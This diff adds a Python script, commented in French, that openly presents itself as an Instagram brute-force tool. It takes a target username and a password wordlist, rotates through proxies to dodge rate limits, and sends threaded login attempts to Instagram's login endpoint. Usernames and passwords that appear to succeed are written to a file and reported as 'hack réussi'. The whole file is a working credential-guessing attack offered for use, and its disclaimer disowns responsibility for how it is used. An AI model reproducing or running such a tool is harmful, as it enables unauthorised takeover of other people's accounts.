@@ -1,0 +1,150 @@
+#!/usr/bin/python3
+#  Commencer le 05/12/2021 à 19H10
+#  Brute force Instagram
+#  Changement de l'adresse mac
+#  Usurpation
+#  Je ne suis en aucun cas responsable de votre acte !!!
+#  Vole pas mon code mdr
+from __future__ import absolute_import
+from __future__ import print_function
+import requests, sys, threading, time, os, random
+import json
+from colorama import Fore
+CheckVersion = str(sys.version)
+import re
+from datetime import datetime
+
+
+print(""" ▄█     ▄██████▄  ▀█████████▄     ▄████████ ███    █▄      ███        ▄████████ 
+███    ███    ███   ███    ███   ███    ███ ███    ███ ▀█████████▄   ███    ███ 
+███▌   ███    █▀    ███    ███   ███    ███ ███    ███    ▀███▀▀██   ███    █▀  
+███▌  ▄███         ▄███▄▄▄██▀   ▄███▄▄▄▄██▀ ███    ███     ███   ▀  ▄███▄▄▄     
+███▌ ▀▀███ ████▄  ▀▀███▀▀▀██▄  ▀▀███▀▀▀▀▀   ███    ███     ███     ▀▀███▀▀▀     
+███    ███    ███   ███    ██▄ ▀███████████ ███    ███     ███       ███    █▄  
+███    ███    ███   ███    ███   ███    ███ ███    ███     ███       ███    ███ 
+█▀     ████████▀  ▄█████████▀    ███    ███ ████████▀     ▄████▀     ██████████ 
+                                 ███    ███                                     
+
+*****************************************************
+*GITHUB: https://github.com/actonetor               *
+*IG: https://www.instagram.com/@lefrentoune         *
+*TIKTOK: https://tiktok.com/@charlie_bernard_au_fbi *
+*****************************************************""")
+
+class InstaBrute(object):
+    def __init__(self):
+
+        try:
+            user = input('nom : ')
+            Combo = input('wordlist : ')
+            if (Combo == ""):
+                Combo = "pass.Txt"
+            self.CurrentProxy = ''
+            self.UsedProxys = []
+            UsePorxy = input("Vouler vous utiliser un proxy ? [o / n] >  ")
+            if (UsePorxy == 'o' or UsePorxy == 'oui'):
+                self.randomProxy()
+
+            print('\n____________________________')
+
+        except:
+            print(' le programme vas quitter...')
+            time.sleep(1)
+            sys.exit()
+
+        with open(Combo, 'r') as x:
+            Combolist = x.read().splitlines()
+        thread = []
+        self.Coutprox = 0
+        for combo in Combolist:
+            password = combo.split(':')[0]
+            t = threading.Thread(target=self.New_Br, args=(user, password))
+            t.start()
+            thread.append(t)
+            time.sleep(0.9)
+        for j in thread:
+            j.join()
+
+    def randomProxy(self):
+        plist = open('proxy.txt').read().splitlines()
+        proxy = random.choice(plist)
+
+        if not proxy in self.UsedProxys:
+            self.CurrentProxy = proxy
+            self.UsedProxys.append(proxy)
+        while 1:
+            try:
+                print('')
+                print('[*] Check de la nouvelle ip...')
+                response = requests.get('https://api.ipify.org/?format=raw', proxies={"http": proxy, "https": proxy},
+                                        timeout=10.0).text
+                if re.match(r'((?:\d{1,3}\.){3}\d{1,3})', response) != None:
+                    print('[*] ton ip public: %s' % response)
+                    print('')
+                    break
+                else:
+                    continue
+                # if response.rtrim().ltrim() == "HTTP/1.1 400 Bad Request":
+                #     raise Exception("Can not reach proxy")
+                # else:
+                #     break
+            except Exception as e:
+                print('[*] ne peut lancer le proxy "%s"' % proxy)
+                proxy = random.choice(plist)
+            print('')
+
+    def cls(self):
+        linux = 'clear'
+        windows = 'cls'
+        os.system([linux, windows][os.name == 'nt'])
+
+    def New_Br(self, user, pwd):
+        link = 'https://www.instagram.com/accounts/login/'
+        login_url = 'https://www.instagram.com/accounts/login/ajax/'
+
+        time = int(datetime.now().timestamp())
+
+        payload = {
+            'username': user,
+            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{pwd}',
+            'queryParams': {},
+            'optIntoOneTap': 'false'
+        }
+
+        with requests.Session() as s:
+            r = s.get(link)
+            r = s.post(login_url, data=payload, headers={
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
+                "X-Requested-With": "XMLHttpRequest",
+                "Referer": "https://www.instagram.com/accounts/login/",
+                "x-csrftoken": 'ZxKmz4hXp6XKmTPg9lzgYxXN4sFr2pzo'
+            })
+
+            
+            data = json.loads(r.text)
+            if (data['status'] == 'fail'):
+                print('')
+                print(data['message'])
+                print('--> pas de proxy')
+                UsePorxy = self.randomProxy()
+            print('----------------------------')
+            print ('username: '+ user + ' | '' password: '+ pwd )
+            print('----------------------------')
+            if 'checkpoint_url' in r.text:
+                print(('' + user + ':' + pwd + ' --> hack réussi '))
+                with open('good.txt', 'a') as x:
+                    x.write(user + ':' + pwd + '\n')
+            if 'checkpoint_required' in r.text:
+                print(('' + user + ':' + pwd + ' --> hack réussi '))
+                with open('good.txt', 'a') as x:
+                    x.write(user + ':' + pwd + '\n')
+            elif 'two_factor_required' in r.text:
+                print(('' + user + ':' + pwd + ' -->  bien tous a été check '))
+                with open('results_NeedVerfiy.txt', 'a') as x:
+                    x.write(user + ':' + pwd + '\n')
+
+
+
+InstaBrute()
+
+
